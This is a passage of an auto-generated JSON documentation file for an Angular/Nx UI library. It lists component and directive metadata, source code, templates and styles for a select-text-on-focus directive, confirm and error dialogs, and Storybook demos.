          "deprecationMessage": "",
          "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
          "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
          "line": 29
        },
        {
          "name": "focus",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
          "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
          "line": 29
        }
      ],
      "propertiesClass": [
        {
          "name": "_el",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HTMLInputElement",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_hasSelectTextOnFocusEnabled",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 17,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 15,
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 50,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 39,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nSubscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.\n",
          "description": "<p>Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.</p>\n"
        },
        {
          "name": "onFocus",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 29,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nListens for focus events on the host (input) element, and focuses if applicable\n",
          "description": "<p>Listens for focus events on the host (input) element, and focuses if applicable</p>\n",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'focus'"
            },
            {
              "name": "HostListener",
              "stringifiedArguments": "'dblclick'"
            }
          ]
        }
      ],
      "implements": [
        "OnInit",
        "OnDestroy"
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "userPreferenceService",
            "type": "StoUserPreferenceService",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 18,
        "jsdoctags": [
          {
            "name": "elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "userPreferenceService",
            "type": "StoUserPreferenceService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "readme": "<h4 id=\"stoselecttextonfocusdirective\">StoSelectTextOnFocusDirective</h4>\n<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input.\nA user service is established in that allows a user to toggle this feature</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;input matInput stoSelectTextOnFocus\n    [formControl]=&quot;freeTextControl&quot; placeholder=&quot;Free Text&quot;&gt;</code></pre></div>"
    }
  ],
  "components": [
    {
      "name": "AppComponent",
      "id": "component-AppComponent-be478fcb0ce9a92af4d96bd7fc0ae299de394dbc965a16b3c94a17e3bb365d2be80b5ca2a0624a4e3cf5b92a35b03e318e8df87b5551f3f8eab1d06c51c1ae05",
      "file": "apps/oilmod-web/src/app/app.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "oilmod-web-nx-root",
      "styleUrls": [
        "./app.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./app.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "title",
          "defaultValue": "'oilmod-web'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 9
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component } from '@angular/core';\n\n@Component({\n  selector: 'oilmod-web-nx-root',\n  templateUrl: './app.component.html',\n  styleUrls: ['./app.component.scss'],\n})\nexport class AppComponent {\n  title = 'oilmod-web';\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "/*\n * Remove template code below\n */\n:host {\n  display: block;\n  font-family: sans-serif;\n  min-width: 300px;\n  max-width: 600px;\n  margin: 50px auto;\n}\n\n.gutter-left {\n  margin-left: 9px;\n}\n\n.col-span-2 {\n  grid-column: span 2;\n}\n\n.flex {\n  display: flex;\n  align-items: center;\n  justify-content: center;\n}\n\nheader {\n  background-color: #143055;\n  color: white;\n  padding: 5px;\n  border-radius: 3px;\n}\n\nmain {\n  padding: 0 36px;\n}\n\np {\n  text-align: center;\n}\n\nh1 {\n  text-align: center;\n  margin-left: 18px;\n  font-size: 24px;\n}\n\nh2 {\n  text-align: center;\n  font-size: 20px;\n  margin: 40px 0 10px 0;\n}\n\n.resources {\n  text-align: center;\n  list-style: none;\n  padding: 0;\n  display: grid;\n  grid-gap: 9px;\n  grid-template-columns: 1fr 1fr;\n}\n\n.resource {\n  color: #0094ba;\n  height: 36px;\n  background-color: rgba(0, 0, 0, 0);\n  border: 1px solid rgba(0, 0, 0, 0.12);\n  border-radius: 4px;\n  padding: 3px 9px;\n  text-decoration: none;\n}\n\n.resource:hover {\n  background-color: rgba(68, 138, 255, 0.04);\n}\n\npre {\n  padding: 9px;\n  border-radius: 4px;\n  background-color: black;\n  color: #eee;\n}\n\ndetails {\n  border-radius: 4px;\n  color: #333;\n  background-color: rgba(0, 0, 0, 0);\n  border: 1px solid rgba(0, 0, 0, 0.12);\n  padding: 3px 9px;\n  margin-bottom: 9px;\n}\n\nsummary {\n  cursor: pointer;\n  outline: none;\n  height: 36px;\n  line-height: 36px;\n}\n\n.github-star-container {\n  margin-top: 12px;\n  line-height: 20px;\n}\n\n.github-star-container a {\n  display: flex;\n  align-items: center;\n  text-decoration: none;\n  color: #333;\n}\n\n.github-star-badge {\n  color: #24292e;\n  display: flex;\n  align-items: center;\n  font-size: 12px;\n  padding: 3px 10px;\n  border: 1px solid rgba(27, 31, 35, 0.2);\n  border-radius: 3px;\n  background-image: linear-gradient(-180deg, #fafbfc, #eff3f6 90%);\n  margin-left: 4px;\n  font-weight: 600;\n}\n\n.github-star-badge:hover {\n  background-image: linear-gradient(-180deg, #f0f3f6, #e6ebf1 90%);\n  border-color: rgba(27, 31, 35, 0.35);\n  background-position: -0.5em;\n}\n.github-star-badge .material-icons {\n  height: 16px;\n  width: 16px;\n  margin-right: 4px;\n}\n",
          "styleUrl": "./app.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<header class=\"flex\">\n  <img\n    alt=\"Nx logo\"\n    width=\"75\"\n    src=\"https://nx.dev/assets/images/nx-logo-white.svg\"\n  />\n  <h1>Welcome to {{ title }}!</h1>\n</header>\n<main>\n  <h2>Resources &amp; Tools</h2>\n  <p>Thank you for using and showing some ♥ for Nx.</p>\n  <div class=\"flex github-star-container\">\n    <a\n      href=\"https://github.com/nrwl/nx\"\n      target=\"_blank\"\n      rel=\"noopener noreferrer\"\n    >\n      If you like Nx, please give it a star:\n      <div class=\"github-star-badge\">\n        <svg\n          class=\"material-icons\"\n          xmlns=\"http://www.w3.org/2000/svg\"\n          width=\"24\"\n          height=\"24\"\n          viewBox=\"0 0 24 24\"\n        >\n          <path d=\"M0 0h24v24H0z\" fill=\"none\" />\n          <path\n            d=\"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z\"\n          />\n        </svg>\n        Star\n      </div>\n    </a>\n  </div>\n  <p>Here are some links to help you get started.</p>\n  <ul class=\"resources\">\n    <li class=\"col-span-2\">\n      <a class=\"resource flex\" href=\"https://nxplaybook.com/p/nx-workspaces\">\n        Nx video course\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a\n        class=\"resource flex\"\n        href=\"https://nx.dev/latest/angular/getting-started/getting-started\"\n      >\n        Nx video tutorial\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a\n        class=\"resource flex\"\n        href=\"https://nx.dev/latest/angular/tutorial/01-create-application\"\n      >\n        Interactive tutorial\n      </a>\n    </li>\n    <li class=\"col-span-2\">\n      <a class=\"resource flex\" href=\"https://nx.app/\">\n        <svg\n          width=\"36\"\n          height=\"36\"\n          viewBox=\"0 0 120 120\"\n          fill=\"none\"\n          xmlns=\"http://www.w3.org/2000/svg\"\n        >\n          <path\n            d=\"M120 15V30C103.44 30 90 43.44 90 60C90 76.56 76.56 90 60 90C43.44 90 30 103.44 30 120H15C6.72 120 0 113.28 0 105V15C0 6.72 6.72 0 15 0H105C113.28 0 120 6.72 120 15Z\"\n            fill=\"#0E2039\"\n          />\n          <path\n            d=\"M120 30V105C120 113.28 113.28 120 105 120H30C30 103.44 43.44 90 60 90C76.56 90 90 76.56 90 60C90 43.44 103.44 30 120 30Z\"\n            fill=\"white\"\n          />\n        </svg>\n        <span class=\"gutter-left\">Nx Cloud</span>\n      </a>\n    </li>\n  </ul>\n  <h2>Next Steps</h2>\n  <p>Here are some things you can do with Nx.</p>\n  <details open>\n    <summary>Add UI library</summary>\n    <pre>\n# Generate UI lib\nng g @nrwl/angular:lib ui\n\n# Add a component\nng g @nrwl/angular:component xyz --project ui</pre\n    >\n  </details>\n  <details>\n    <summary>View dependency graph</summary>\n    <pre>nx dep-graph</pre>\n  </details>\n  <details>\n    <summary>Run affected commands</summary>\n    <pre>\n# see what's been affected by changes\nng affected:dep-graph\n\n# run tests for current changes\nng affected:test\n\n# run e2e tests for current changes\nng affected:e2e\n</pre\n    >\n  </details>\n</main>\n"
    },
    {
      "name": "ConfirmComponent",
      "id": "component-ConfirmComponent-e22d96ac519926e363ba590d7e2cf7060f8505f85c5ceaa3fe3b9b20258902647d8b4b4e43e5adfa57d98fc280b8bf9a255c5ea08d8d9625f31f02c5984426e6",
      "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-confirm",
      "styleUrls": [
        "sto-confirm-dialog.component.scss"
      ],
      "styles": [],
      "template": "<h3 *ngIf=\"data.title\"\n    mat-dialog-title>{{ data.title }}</h3>\n<div mat-dialog-content>\n  <p>{{ data.message }}</p>\n</div>\n<div mat-dialog-actions>\n  <button #ok\n          color=\"primary\"\n          mat-flat-button\n          [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\n  <button #cancel\n          *ngIf=\"data.showCancel\"\n          title=\"Cancel (esc)\"\n          mat-button\n          [mat-dialog-close]=\"false\">Cancel\n  </button>\n</div>\n",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "data",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Data",
          "optional": false,
          "description": "",
          "line": 41,
          "decorators": [
            {
              "name": "Inject",
              "stringifiedArguments": "MAT_DIALOG_DATA"
            }
          ],
          "modifierKind": [
            123
          ]
        },
        {
          "name": "dialogRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatDialogRef<ConfirmComponent>",
          "optional": false,
          "description": "",
          "line": 41,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "ok",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLButtonElement>",
          "optional": false,
          "description": "",
          "line": 39,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'ok'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "<p>A confirm dialog that emits an observable.</p>\n",
      "rawdescription": "\n\nA confirm dialog that emits an observable.\n",
      "type": "component",
      "sourceCode": "import { Component, ElementRef, Inject, ViewChild } from '@angular/core';\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\n\ntype Data = {\n  title: string;\n  message: string;\n  showCancel?: boolean;\n  confirmText: string;\n}\n\n/**\n * A confirm dialog that emits an observable.\n */\n@Component({\n  selector: 'sto-confirm',\n  template: `\n    <h3 *ngIf=\"data.title\"\n        mat-dialog-title>{{ data.title }}</h3>\n    <div mat-dialog-content>\n      <p>{{ data.message }}</p>\n    </div>\n    <div mat-dialog-actions>\n      <button #ok\n              color=\"primary\"\n              mat-flat-button\n              [mat-dialog-close]=\"true\">{{ data.confirmText }}</button>\n      <button #cancel\n              *ngIf=\"data.showCancel\"\n              title=\"Cancel (esc)\"\n              mat-button\n              [mat-dialog-close]=\"false\">Cancel\n      </button>\n    </div>\n  `,\n  styleUrls: ['sto-confirm-dialog.component.scss']\n})\nexport class ConfirmComponent {\n  @ViewChild('ok')\n  ok: ElementRef<HTMLButtonElement>;\n\n  constructor(@Inject(MAT_DIALOG_DATA) public data: Data, public dialogRef: MatDialogRef<ConfirmComponent>) {\n  }\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "",
          "styleUrl": "sto-confirm-dialog.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "data",
            "type": "Data",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "dialogRef",
            "type": "MatDialogRef<ConfirmComponent>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 39,
        "jsdoctags": [
          {
            "name": "data",
            "type": "Data",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "dialogRef",
            "type": "MatDialogRef<ConfirmComponent>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "readme": "<h4 id=\"stoconfirmdialog\">StoConfirmDialog</h4>\n<p> A confirm dialog that emits an observable.\n The ConfirmService is injected to a component and used from there.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">class MyComp {\n  constructor(private confirmService: ConfirmService) {}\n  // component logic\n}</code></pre></div><p>Here the ConfirmService is injected to a component through the constructor.</p>\n<p>#####confirm\nThe confirm method takes three arguments, the message in the dialog, a title and the text for the confirm or &quot;OK&quot; utton. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">this.confirmSvc.confirm(message, title, confirmText)\n     .subscribe(isConfirmed =&gt; {\n       if (isConfirmed) {\n           //Do stuff\n       }\n       else {\n         // Ignore\n       }\n     }); </code></pre></div>"
    },
    {
      "name": "ConfirmDemoComponent",
      "id": "component-ConfirmDemoComponent-7f57b03e449d3dd4e736b3632d2374fd565da8f6074baf0b083d655a800c0213fc01df5a06fc8844e8a8f256122b1833c220a92e5ea94f56c597d517f7f02867",
      "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "app-confirm-demo",
      "styleUrls": [],
      "styles": [],
      "template": "<button (click)=\"show()\"\n        mat-button>Show confirm\n</button>\n",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "show",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 19,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatButtonModule } from '@angular/material/button';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\n// @ts-ignore\nimport { Component, NgModule } from '@angular/core';\nimport { ConfirmModule, ConfirmService } from '@ngx-stoui/common';\n\n@Component({\n  selector: 'app-confirm-demo',\n  template: `\n    <button (click)=\"show()\"\n            mat-button>Show confirm\n    </button>\n  `,\n\n})\nclass ConfirmDemoComponent {\n  show() {\n    this.confirm.confirm('Confirmation message should be short', 'Confirm delete', 'Delete');\n  }\n\n  constructor(private confirm: ConfirmService) {\n  }\n}\n\n@NgModule({\n  declarations: [ConfirmDemoComponent],\n  exports: [ConfirmDemoComponent],\n})\nclass ConfirmerModule {}\n\nexport default {\n  title: 'common/Confirm Service',\n  decorators: [\n    moduleMetadata({\n      imports: [\n        ConfirmModule, ConfirmerModule, BrowserAnimationsModule, MatButtonModule ],\n      declarations: [  ],\n    })\n  ],\n  parameters: {\n  },\n} as Meta;\n\n\nexport const Usage: Story<ConfirmDemoComponent> = (args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n};\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "confirm",
            "type": "ConfirmService",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 21,
        "jsdoctags": [
          {
            "name": "confirm",
            "type": "ConfirmService",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "DialogComponent",
      "id": "component-DialogComponent-9656aaafee0ac5ff188f65ae3f7511b391dc110074e453a5a0789a96fecb4817a991b65a83f6aed3212bac3c89e3176517ec9e41f2b6842de7a34448fc14ff46",
      "file": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-dialog",
      "styleUrls": [
        "./dialog.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./dialog.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "data",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HttpError",
          "optional": false,
          "description": "",
          "line": 12,
          "decorators": [
            {
              "name": "Inject",
              "stringifiedArguments": "MAT_DIALOG_DATA"
            }
          ],
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "handleEvent",
          "args": [
            {
              "name": "action",
              "type": " |  | undefined",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 16,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "action",
              "type": " |  | undefined",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, Inject } from '@angular/core';\nimport { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';\nimport { HttpError } from '../http-error';\n\n@Component({\n  selector: 'sto-dialog',\n  templateUrl: './dialog.component.html',\n  styleUrls: [ './dialog.component.scss' ]\n})\nexport class DialogComponent {\n\n  constructor(@Inject(MAT_DIALOG_DATA) public data: HttpError, private ref: MatDialogRef<DialogComponent>) {\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\n  handleEvent(action: ((...args: any[]) => unknown) | unknown | undefined) {\n    if ( typeof action === 'function' ) {\n      try {\n        action(this.data);\n      } catch ( ex ) {\n        console.warn('Failed to execute function.');\n        console.warn(ex);\n      }\n    }\n    this.ref.close(action || this.data);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "",
          "styleUrl": "./dialog.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "data",
            "type": "HttpError",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ref",
            "type": "MatDialogRef<DialogComponent>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 10,
        "jsdoctags": [
          {
            "name": "data",
            "type": "HttpError",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "ref",
            "type": "MatDialogRef<DialogComponent>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "templateData": "<h3 style=\"font-weight: 500\"\n    mat-dialog-title>\n  {{ data.title }}\n</h3>\n<mat-dialog-content>\n  <p style=\"font-size: 16px; white-space: pre-line\">{{ data.text }}</p>\n</mat-dialog-content>\n<mat-dialog-actions style=\"justify-content: flex-end\">\n  <button color=\"primary\"\n          mat-button\n          *ngIf=\"!(data.actions || []).length\"\n          mat-dialog-close>OK\n  </button>\n  <button color=\"primary\"\n          mat-button\n          *ngFor=\"let a of data.actions\"\n          (click)=\"handleEvent(a.action || a.closeDialogData)\">\n    {{ a.label }}\n  </button>\n</mat-dialog-actions>\n"
    },
    {
      "name": "DialogDemoComponent",
      "id": "component-DialogDemoComponent-cd66458fa94dcd76495cb3f35090b0cc83b790e7ad5e8e2d61af1965ddd2623aa463be6329607c1b21998f4f970d41c0d76d1a6a1b9ffadf5bfd9a5e867da6d3",
      "file": "libs/core/src/lib/styles.stories.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "app-dialog-demo",
      "styleUrls": [],
      "styles": [],
      "template": "  <button mat-button\n          (click)=\"show(tmpl)\">Show dialog\n  </button>\n  <ng-template #tmpl>\n    <h3 mat-dialog-title>Dialog Title</h3>\n    <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\n      <ul style=\"padding-left: 12px\">\n        <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\n        <ul>\n          <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\n        </ul>\n        <li>Dialog title should always be with an h3 element</li>\n        <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\n      </ul>\n      <p>Configuration:</p>\n      <code><pre>\n  const dialogConfig = new MatDialogConfig();\n  dialogConfig.width = '560px';\n  dialogConfig.panelClass = 'sto-dialog';\n  @NgModule(\n      ...,\n  providers: [\n        {{ '{' }}\n        provide: MAT_DIALOG_DEFAULT_OPTIONS,\n    useValue: dialogConfig\n        {{ '}' }}],\n  ...\n  )\n  export class AppModule...\n</pre>\n      </code>\n    </mat-dialog-content>\n    <mat-dialog-actions>\n      <button mat-button\n              mat-dialog-close>Cancel\n      </button>\n      <button mat-button\n              mat-dialog-close\n              color=\"primary\">Save\n      </button>\n    </mat-dialog-actions>\n  </ng-template>\n",
      "templateUrl": [],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "separatorLines",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 61,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "show",
          "args": [
            {
              "name": "tmpl",
              "type": "TemplateRef<>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 63,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "tmpl",
              "type": "TemplateRef<>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatCardModule } from '@angular/material/card';\nimport { MatDialog, MatDialogModule } from '@angular/material/dialog';\nimport { Component, Input, TemplateRef } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatTabsModule } from '@angular/material/tabs';\n\n@Component({\n  selector: 'app-dialog-demo',\n  template: `\n    <button mat-button\n            (click)=\"show(tmpl)\">Show dialog\n    </button>\n    <ng-template #tmpl>\n      <h3 mat-dialog-title>Dialog Title</h3>\n      <mat-dialog-content [class.scroll-lines]=\"separatorLines\">\n        <ul style=\"padding-left: 12px\">\n          <li>Dialog actions should (nearly) always be text-buttons (never raised).</li>\n          <ul>\n            <li>Exception is e.g to confirm a deletion, in which case you can use \"mat-stroked-button\" with color=\"warn\"</li>\n          </ul>\n          <li>Dialog title should always be with an h3 element</li>\n          <li>Dialog textual content should always be done using paragraphs (&lt;p&gt;)</li>\n        </ul>\n        <p>Configuration:</p>\n        <code><pre>\n    const dialogConfig = new MatDialogConfig();\n    dialogConfig.width = '560px';\n    dialogConfig.panelClass = 'sto-dialog';\n    @NgModule(\n        ...,\n    providers: [\n          {{ '{' }}\n          provide: MAT_DIALOG_DEFAULT_OPTIONS,\n      useValue: dialogConfig\n          {{ '}' }}],\n    ...\n    )\n    export class AppModule...\n  </pre>\n        </code>\n      </mat-dialog-content>\n      <mat-dialog-actions>\n        <button mat-button\n                mat-dialog-close>Cancel\n        </button>\n        <button mat-button\n                mat-dialog-close\n                color=\"primary\">Save\n        </button>\n      </mat-dialog-actions>\n    </ng-template>\n  `\n})\nclass DialogDemoComponent {\n  @Input()\n  separatorLines: boolean;\n\n  show(tmpl: TemplateRef<unknown>) {\n    this.dialog.open(tmpl, {\n      width: '560px',\n      panelClass: 'sto-dialog'\n    });\n  }\n\n  constructor(private dialog: MatDialog) {\n  }\n}\n\nexport default {\n  title: 'core/Styles',\n  decorators: [\n    moduleMetadata({\n      imports: [ MatCardModule, MatTabsModule, MatDialogModule, CommonModule, BrowserAnimationsModule, MatButtonModule, MatIconModule ],\n      declarations: [ DialogDemoComponent ]\n    })\n  ],\n  argTypes: {\n    template: { control: { disable: true } }\n  }\n} as Meta;\n\nexport const StoCard: Story<{ withStyles: boolean }> = (args) => ( {\n  props: { ...args },\n  template: `<mat-card [class.sto-card]=\"withStyles\">\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\n</mat-card>`\n} );\nStoCard.args = {\n  withStyles: true\n};\n\nexport const StoDialog: Story<Record<string, unknown>> = (args) => ( {\n  props: { ...args },\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\n} );\nStoDialog.args = {\n  separatorLines: false\n};\n\nexport const StoTheme: Story<Record<string, unknown>> = args => ( {\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\n  styles: [\n    `\n    .container { display: flex; }\n    .container > div {\n     flex: 0 1 auto;\n     padding-left: 16px;\n     }\n    `\n  ],\n  template: `\n  <mat-tab-group>\n  <mat-tab label=\"Buttons\">\n    <mat-card class=\"sto-card\">\n    <div *ngFor=\"let color of colors\">\n      <mat-card-subtitle class=\"sto-card__subtitle\">\n    <h2>{{ color }}</h2>\n</mat-card-subtitle>\n    <button mat-button [color]=\"color\">Mat Button</button>\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\n</div>\n</mat-card>\n  </mat-tab>\n  <mat-tab label=\"Cards\">\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\n  <mat-card-title>{{ c }}</mat-card-title>\n</mat-card>\n</mat-tab>\n<mat-tab label=\"Text\">\n<mat-card class=\"sto-card\">\n    <div class=\"container\">\n    <div>\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\n</div>\n<div>\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;span&gt; {{ color }}\n</span>\n</div>\n<div>\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\n</h2>\n</div>\n</div>\n</mat-card>\n</mat-tab>\n</mat-tab-group>\n  `,\n} );\n/*StoTheme.argTypes = {\n  color: { control: { type: 'select', options: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] }, defaultValue: 'primary' },\n};*/\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 68,
        "jsdoctags": [
          {
            "name": "dialog",
            "type": "MatDialog",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
